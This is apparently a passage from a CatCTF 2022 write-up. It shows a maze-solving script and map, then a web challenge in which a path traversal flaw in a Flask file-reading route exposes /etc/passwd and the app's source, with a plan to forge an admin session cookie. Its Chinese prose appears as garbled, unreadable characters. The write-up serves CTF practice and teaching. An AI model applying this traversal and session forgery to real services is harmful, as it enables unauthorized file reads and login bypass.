class="line">        move(key[k])</span><br><span class="line">        dfs()</span><br><span class="line">        move(key[k ^ <span class="number">1</span>])</span><br><span class="line">        IsGo[y][x] = <span class="number">0</span></span><br><span class="line">choice()</span><br><span class="line">choice()</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">InitMaze()</span><br><span class="line">get_maze(-<span class="number">1</span>)</span><br><span class="line">PrintMaze()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> i&lt;<span class="built_in">len</span>(line):</span><br><span class="line">    <span class="built_in">dir</span>=line[i]</span><br><span class="line">    move(<span class="built_in">dir</span>)</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="comment"># x=1</span></span><br><span class="line"><span class="comment"># y=1</span></span><br><span class="line"><span class="comment"># InitMaze()</span></span><br><span class="line"><span class="comment"># move(&#x27;W&#x27;)</span></span><br><span class="line">dfs()</span><br><span class="line">cmd=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">dir</span>=<span class="built_in">input</span>(<span class="string">&#x27;cmd$&#x27;</span>)</span><br><span class="line">    <span class="built_in">dir</span>=<span class="built_in">dir</span>.upper()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">dir</span>==<span class="string">&#x27;PRINT&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(cmd)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">dir</span>=<span class="built_in">dir</span>[<span class="number">0</span>]</span><br><span class="line">    k=key.find(<span class="built_in">dir</span>)</span><br><span class="line">    <span class="keyword">if</span> k==-<span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;wrong&#x27;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> move(<span class="built_in">dir</span>):</span><br><span class="line">        cmd += key[k]</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™ä¸ªè„šæœ¬ä¸­ï¼Œä¼šè®°å½•åœ°å›¾ä¸€å±‚çš„æ ·è²Œï¼Œå¯ä»¥æ‰‹èµ°ã€‚å¾—åˆ°æ‰‹èµ°çš„payloadä¹‹åå¯ä»¥åœ¨lineå˜é‡æœ«å°¾æ·»åŠ ï¼Œå†ä»¥æ­¤ä¸ºåŸºç¡€å†è¿›è¡Œdfsï¼Œå¤šæ¬¡æ¥å›ä¹‹åå¯ä»¥å¾—åˆ°åœ°å›¾å…¨è²Œå’Œè·¯çº¿ã€‚</p>
<h4 id="åœ°å›¾"><a href="#åœ°å›¾" class="headerlink" title="åœ°å›¾"></a>åœ°å›¾</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#####################&lt;#...............a##.#.######A##########...#......#.......######B####.#.#####C##aaaa.#c#..#.#...#.########.#.##.#.#.#.##.A.#.A.#..#.#.#.#.##.#.A.#.##.#.#.#.#.##.#######..#.#.#.#.##.........##.#.#.#.##.##########.#.#.#.##.#...#..#..A#.#.#.##.#.#.#.####.#b#.#.##.#.#.#..#...###.#.##.#.#.##.#.#.#.#.#.##...#.#..#.#.#...#.######.#.##.#.#.#.#.##..........#...#.#&gt;##########################################&lt;#............#...##.#.###.######.#.#.##...#.#.#.#..#.#.#.######.#.#.C.b#.#.#.##.........#..#.#.#.#########.#######.#.##...#.a#.........#.##.#.#.##.#########.##.#.#.##.#.........##.#.#..#.#.##########.#.##.#.#....B....##.#....#.#.#.#.###.##.#.####.#.#.#a#c#.##.#.AAb#.#.#.#a#.#.##.######.#.#.###.#.##........###.A...#.##.########&gt;#######.##........#B........##########################################&lt;.................########.##########.##..........#...#b#.########.#..#.#.#.#.##....a#.#..#.#.#.#.##.#####.#....#.#.#.##.#a..C.######.#.#.##.#####......#.#.#.##.C.#...######.#.#.##.#.#.#......#.A.#.##.#.#.#.####.#####.##.#.#.#....#.#a....##.#.#.#.####.########.#.#.#....#B.....c##.#.#.####.#.########.#.#.#....#A.....c##.#.#.######.########.#...#.....A.....&gt;##########################################&lt;#a...............##.################.##..................##.###################.A...............b##.###################.C...............a##.###################.#.A.#.a.#.BA#.CB&gt;##.Bc#ba.#.B.#Ac.#..##.###################.B..............aa##.###################.C.............bbb##.###################.AA............bbb##.###################.BBB.............c##########################################&lt;#................##.#.##############.##.#..............#.##.##############.#.##.#..............#.##.#.##############.##.#..............#.##.##############.#.##.#ac#...#...#...#.##.##B..#...#...#.#.##.################.##..................##b###################.#...............&gt;##.#C#################.#................##.################.##A.................##########################################&lt;#.a..............##.#.##############.##...#...........b#.######A############.##................#.#################.#.##...Ca#c.......#.#.##.#.#a########A#.#.##.#.#.#........#.#.##.#.#.#.########.#.##.#.#.#.#.C....#.#.##.#.#.#.#&gt;#.##.#.#.##.#.#.#A######.#.#.##.#.#..........#.#.##.#.############.#.##.#................##.###################.B...............c##########################################&lt;................a##.################.##..................###################A##..................##.###################..................##.################.##.#aB.#c####&gt;#...#.##.#.#.#..##.C#.#.#.##.#.#.#.####.#.#.#.##.#.#.#..##..#.#.#.##.#.#.##.##.##.#.#.##.#.#.#..##..#.#.#.##.#.#.#.####.#.#.#.##.#.#.#..##.b#.#.#.##.#.#.##.##.##.#.#.##...#....##....#.A.##########################################&lt;#...............c##.#.#################..................#################C####c#..............#&gt;##.#.############.#.##.#.#.........a#.#.##.#.#.##########.#.##.#.#..........#.#.##.#.##########.#.#.##.#.#..........#.#B##.#.#.##########.#.##.#.#.............C##.#.#.############.##.#.#.#...#...#b##.##.#.#.#.#.#.#.#.##.##.#.#.#.#.#.#.#.##.##.A.#...#...#.A.##a##########################################&lt;#.......a........##.#C##############C##cc................####A#################&gt;#.C.............b##.#.#################.#.#..............##.#.#.############.##.#.#.#..a#........##.#.#.#.#.#.####.#.##.#.#.#.#.#......#.##.#.#.#.#.#.####.#.##.#.#.#.#.#......#.##.#.#.#.#.######.#.##.#.#.#.#.#..A.#.#.##.#...#.#.#.c#...#.##.#####.#.########.##.C.....#.B........##########################################&lt;.................####.##############C##...#....#...#...#.##.#...##...#...#b#.##.#.##############.##.#..............#.##.##############.#.##.#..............#.##.#.##############.##.#..............#.##.##############.#.##.#..............#.##.#.##############.##.#..............#.##.##############B#T##.#a.............####A###################...............c#-#####################</span><br></pre></td></tr></table></figure>

<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="ez-jsğŸ¦"><a href="#ez-jsğŸ¦" class="headerlink" title="ez_jsğŸ¦"></a>ez_jsğŸ¦</h3><img src="/2023/01/01/Nepnep-CatCTF2022/ezjs_0joxEf_9RP.png" class="">

<img src="/2023/01/01/Nepnep-CatCTF2022/ezjsFlag_ZAsp7O0tyR.png" class="">

<h3 id="Cat-catğŸ˜¼"><a href="#Cat-catğŸ˜¼" class="headerlink" title="Cat catğŸ˜¼"></a>Cat catğŸ˜¼</h3><p>Edited by lx56</p>
<h4 id="ä¿¡æ¯æ”¶é›†ä¸å°è¯•"><a href="#ä¿¡æ¯æ”¶é›†ä¸å°è¯•" class="headerlink" title="ä¿¡æ¯æ”¶é›†ä¸å°è¯•"></a>ä¿¡æ¯æ”¶é›†ä¸å°è¯•</h4><h4 id="é¢˜ç›®é¦–é¡µ"><a href="#é¢˜ç›®é¦–é¡µ" class="headerlink" title="é¢˜ç›®é¦–é¡µ"></a>é¢˜ç›®é¦–é¡µ</h4><p>è¿›å…¥é¢˜ç›®é¦–é¡µå¯å¾—ä»¥ä¸‹ç•Œé¢</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/%E6%88%AA%E5%9B%BE1_Uri1WaaZUX.png" class="">

<p>å°è¯•ç‚¹å‡»ç»¿è‰²æ–‡å­—å¯ä»¥è·³è½¬åˆ°å¦‚ä¸‹é¡µé¢ï¼Œå¯ä»¥çŒœæµ‹å¯èƒ½å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/%E6%88%AA%E5%9B%BE2_NkYSZXQpfC.jpg" class="">

<h4 id="å°è¯•è¯»å–ç³»ç»Ÿæ–‡ä»¶"><a href="#å°è¯•è¯»å–ç³»ç»Ÿæ–‡ä»¶" class="headerlink" title="å°è¯•è¯»å–ç³»ç»Ÿæ–‡ä»¶"></a>å°è¯•è¯»å–ç³»ç»Ÿæ–‡ä»¶</h4><p>æ£€æµ‹æ˜¯å¦èƒ½ä»»æ„æ–‡ä»¶è¯»å–ï¼Œè¯»å–&#x2F;etc&#x2F;passwdæˆåŠŸ</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/%E6%88%AA%E5%9B%BE3_kQ1eEIpmBZ.jpg" class="">

<h4 id="è¯»å–æºç "><a href="#è¯»å–æºç " class="headerlink" title="è¯»å–æºç "></a>è¯»å–æºç </h4><p>å…ˆè¯»å–cmdlineè·å–æºç æ–‡ä»¶å</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/%E6%88%AA%E5%9B%BE4_-CVDzoa2Ty.jpg" class="">

<p>é€šè¿‡..&#x2F;app.pyè¯»å–æºç </p>
<img src="/2023/01/01/Nepnep-CatCTF2022/%E6%88%AA%E5%9B%BE5_GcJcK3a_on.jpg" class="">

<p>ä¸Šå›¾è¯»å‡ºæ¥çš„æºç å¾ˆä¹±ï¼Œä½†ç”±å‰é¢bå¼€å¤´å¯çŸ¥è¿™æ˜¯pythonä¸­çš„bytesç±»å‹</p>
<p>å¯ä»¥ç›´æ¥ä½¿ç”¨bytesçš„decode()æ–¹æ³•è·å–æ ¼å¼åŒ–çš„æºç ï¼Œå¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">b&#x27;abc\nabc&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(a.decode())</span><br></pre></td></tr></table></figure>

<img src="/2023/01/01/Nepnep-CatCTF2022/%E6%88%AA%E5%9B%BE6_eUY-8G2vkP.jpg" class="">

<p>è·å–æºç å¦‚ä¸‹</p>
<img src="/2023/01/01/Nepnep-CatCTF2022/%E6%88%AA%E5%9B%BE7_6d29js3muE.jpg" class="">

<h4 id="app-py"><a href="#app-py" class="headerlink" title="app.py"></a><a target="_blank" rel="noopener" href="http://app.py/" title="app.py">app.py</a></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session, render_template, Markup</span><br><span class="line"><span class="keyword">from</span> cat <span class="keyword">import</span> cat</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">app = Flask(</span><br><span class="line"> __name__,</span><br><span class="line"> static_url_path=<span class="string">&#x27;/&#x27;</span>,</span><br><span class="line"> static_folder=<span class="string">&#x27;static&#x27;</span></span><br><span class="line">)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(uuid.uuid4()).replace(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>) + <span class="string">&quot;*abcdefgh&quot;</span></span><br><span class="line"><span class="keyword">if</span> os.path.isfile(<span class="string">&quot;/flag&quot;</span>):</span><br><span class="line"> flag = cat(<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line"> os.remove(<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line"> detailtxt = os.listdir(<span class="string">&#x27;./details/&#x27;</span>)</span><br><span class="line"> cats_list = []</span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> detailtxt:</span><br><span class="line">   cats_list.append(i[:i.index(<span class="string">&#x27;.&#x27;</span>)])</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, cats_list=cats_list, cat=cat)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/info&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">info</span>():</span><br><span class="line"> filename = <span class="string">&quot;./details/&quot;</span> + request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"> start = request.args.get(<span class="string">&#x27;start&#x27;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line"> end = request.args.get(<span class="string">&#x27;end&#x27;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line"> name = request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&quot;&quot;</span>)[:request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&quot;&quot;</span>).index(<span class="string">&#x27;.&#x27;</span>)]</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> render_template(<span class="string">&quot;detail.html&quot;</span>, catname=name, info=cat(filename, start, end))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin_can_list_root</span>():</span><br><span class="line"> <span class="keyword">if</span> session.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="number">1</span>:</span><br><span class="line">   <span class="keyword">return</span> flag</span><br><span class="line"> <span class="keyword">else</span>:</span><br><span class="line">   session[<span class="string">&#x27;admin&#x27;</span>] = <span class="number">0</span></span><br><span class="line">   <span class="keyword">return</span> <span class="string">&quot;NoNoNo&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>, port=<span class="number">5637</span>)</span><br></pre></td></tr></table></figure>

<h4 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡"></a>ä»£ç å®¡è®¡</h4><p>ä»æºç å¯çŸ¥Python3ç¨‹åºï¼Œä½¿ç”¨äº†Flaskæ¡†æ¶</p>
<h4 id="å®¡è®¡app-py"><a href="#å®¡è®¡app-py" class="headerlink" title="å®¡è®¡app.py"></a><a target="_blank" rel="noopener" href="http://å®¡è®¡app.py/" title="å®¡è®¡app.py">å®¡è®¡app.py</a></h4><h4 id="flagéƒ¨åˆ†"><a href="#flagéƒ¨åˆ†" class="headerlink" title="flagéƒ¨åˆ†"></a>flagéƒ¨åˆ†</h4><p>é¦–å…ˆå…³æ³¨å«æœ‰flagçš„éƒ¨åˆ†ï¼Œä»¥ä¸‹ä»£ç å¯çŸ¥ç¨‹åºä¸€å¯åŠ¨å°±è¯»å–å¹¶åˆ é™¤flagæ–‡ä»¶</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> os.path.isfile(<span class="string">&quot;/flag&quot;</span>):</span><br><span class="line"> flag = cat(<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line"> os.remove(<span class="string">&quot;/flag&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>å…³æ³¨åˆ°adminè·¯ç”±å¯ä»¥è·å–flagï¼Œä½†æ˜¯éœ€è¦å®Œæˆsessionä¼ªé€ </p>
<p>éœ€è¦ä¼ªé€ å†…å®¹ä¸º<code>&#123;&quot;admin&quot; : 1&#125;</code>çš„sessionï¼Œåˆ™éœ€è¦è·å–secret key</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin_can_list_root</span>():</span><br><span class="line"> <span class="keyword">if</span> session.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="number">1</span>:</span><br><span class="line">   <span class="keyword">return</span> flag</span><br><span class="line"> <span class="keyword">else</span>:</span><br><span class="line">   session[<span class="string">&#x27;admin&#x27;</span>] = <span class="number">0</span></span><br><span class="line">   <span class="keyword">return</span> <span class="string">&quot;NoNoNo&quot;</span></span><br></pre></td></tr></table></figure>

<p>secret keyéƒ¨åˆ†å¦‚ä¸‹ï¼Œæ˜¯ç”Ÿæˆä¸€ä¸ªuuidç„¶åå»é™¤<code>-</code>å†æ‹¼æ¥<code>*abcdefgh</code>ç»„æˆçš„</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(uuid.uuid4()).replace(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>) + <span class="string">&quot;*abcdefgh&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="æ–‡ä»¶è¯»å–éƒ¨åˆ†"><a href="#æ–‡ä»¶è¯»å–éƒ¨åˆ†" class="headerlink" title="æ–‡ä»¶è¯»å–éƒ¨åˆ†"></a>æ–‡ä»¶è¯»å–éƒ¨åˆ†</h4><p>å¯ä»¥çœ‹åˆ°ä»»æ„æ–‡ä»¶è¯»å–åŠŸèƒ½æ˜¯infoè·¯ç”±æä¾›çš„ï¼Œ</p>
<p>æ³¨æ„åˆ°å¯æ§å‚æ•°æœ‰ä¸‰ä¸ªï¼Œåˆ†åˆ«æ˜¯fileï¼Œstartå’Œend</p>
<p>è¿˜æ³¨æ„åˆ°å…¶ä¸­æœ‰ä¸ªcatå‡½æ•°</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/info&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">info</span>():</span><br><span class="line"> filename = <span class="string">&quot;./details/&quot;</span> + request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"> start = request.args.get(<span class="string">&#x27;start&#x27;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line"> end = request.args.get(<span class="string">&#x27;end&#x27;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line"> name = request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&quot;&quot;</span>)[:request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&quot;&quot;</span>).index(<span class="string">&#x27;.&#x27;</span>)]</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> render_template(<span class="string">&quot;detail.html&quot;</span>, catname=name, info=cat(filename, start, end))</span><br></pre></td></tr></table></figure>

<p>åˆ†ææºç å¯çŸ¥catå‡½æ•°ç”±cat.pyæä¾›</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> cat <span class="keyword">import</span> cat</span><br></pre></td></tr></table></figure>

<h4 id="å®¡è®¡cat-py"><a href="#å®¡è®¡cat-py" class="headerlink" title="å®¡è®¡cat.py"></a><a target="_blank" rel="noopener" href="http://å®¡è®¡cat.py/" title="å®¡è®¡cat.py">å®¡è®¡cat.py</a></h4><p>ä½¿ç”¨åŒæ ·çš„æ–¹æ³•è¯»å–cat.pyçš„æºç </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, sys, getopt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cat</span>(<span class="params">filename, start=<span class="number">0</span>, end=<span class="number">0</span></span>)-&gt;<span class="built_in">bytes</span>:</span><br><span class="line">    data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        start = <span class="built_in">int</span>(start)</span><br><span class="line">        end = <span class="built_in">int</span>(end)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        start=<span class="number">0</span></span><br><span class="line">        end=<span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> filename != <span class="string">&quot;&quot;</span> <span class="keyword">and</span> os.access(filename, os.R_OK):</span><br><span class="line">        f = <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> start &gt;= <span class="number">0</span>:</span><br><span class="line">            f.seek(start)</span><br><span class="line">            <span class="keyword">if</span> end &gt;= start <span class="keyword">and</span> end != <span class="number">0</span>:</span><br><span class="line">                data = f.read(end-start)</span><br><span class="line">                </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                data = f.read()</span><br><span class="line">                </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            data = f.read()</span><br><span class="line">            </span><br><span class="line">        f.close()</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        data = (<span class="string">&quot;File `%s` not exist or can not be read&quot;</span> % filename).encode()</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    opts,args = getopt.getopt(sys.argv[<span class="number">1</span>:],<span class="string">&#x27;-h-f:-s:-e:&#x27;</span>,[<span class="string">&#x27;help&#x27;</span>,<span class="string">&#x27;file=&#x27;</span>,<span class="string">&#x27;start=&#x27;</span>,<span class="string">&#x27;end=&#x27;</span>])</span><br><span class="line">    fileName = <span class="string">&quot;&quot;</span></span><br><span class="line">    start = <span class="number">0</span></span><br><span class="line">    end = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> opt_name, opt_value <span class="keyword">in</span> opts:</span><br><span class="line">        <span class="keyword">if</span> opt_name == <span class="string">&#x27;-h&#x27;</span> <span class="keyword">or</span> opt_name == <span class="string">&#x27;--help&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] Help&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;-f --file   File name&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;-s --start   Start position&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;-e --end   End position&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] Example of reading /etc/passwd&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;python3 cat.py -f /etc/passwd&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;python3 cat.py --file /etc/passwd&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;python3 cat.py -f /etc/passwd -s 1&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;python3 cat.py -f /etc/passwd -e 5&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;python3 cat.py -f /etc/passwd -s 1 -e 5&quot;</span>)</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> opt_name == <span class="string">&#x27;-f&#x27;</span> <span class="keyword">or</span> opt_name == <span class="string">&#x27;--file&#x27;</span>:</span><br><span class="line">            fileName = opt_value</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">elif</span> opt_name == <span class="string">&#x27;-s&#x27;</span> <span class="keyword">or</span> opt_name == <span class="string">&#x27;--start&#x27;</span>:</span><br><span class="line">            start = opt_value</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">elif</span> opt_name == <span class="string">&#x27;-e&#x27;</span> <span class="keyword">or</span> opt_name == <span class="string">&#x27;--end&#x27;</span>:</span><br><span class="line">            end = opt_value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> fileName != <span class="string">&quot;&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(cat(fileName, start, end)) </span><br><span class="line">        </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;No file to read&quot;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="æ–‡ä»¶è¯»å–åŠŸèƒ½"><a href="#æ–‡ä»¶è¯»å–åŠŸèƒ½" class="headerlink" title="æ–‡ä»¶è¯»å–åŠŸèƒ½"></a>æ–‡ä»¶è¯»å–åŠŸèƒ½</h4><p>cat.pyåŠŸèƒ½æ¯”è¾ƒç®€å•ï¼Œæ•´æ®µæºç æœ€é‡è¦çš„éƒ¨åˆ†å¦‚ä¸‹</p>
<p>ä¸‹é¢ä»£ç çš„ä½œç”¨æ˜¯è¯»å–æ–‡ä»¶å¹¶ä»¥bytesè¿”å›ï¼Œè§‚å¯Ÿå¯çŸ¥å¯ä»¥è®¾å®šè¯»å–ä½ç½®ï¼ˆstartã€endï¼‰</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">cat</span>(<span class="params">filename, start=<span class="number">0</span>, end=<span class="number">0</span></span>)-&gt;<span class="built_in">bytes</span>:</span><br><span class="line">    data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    </span><br><span 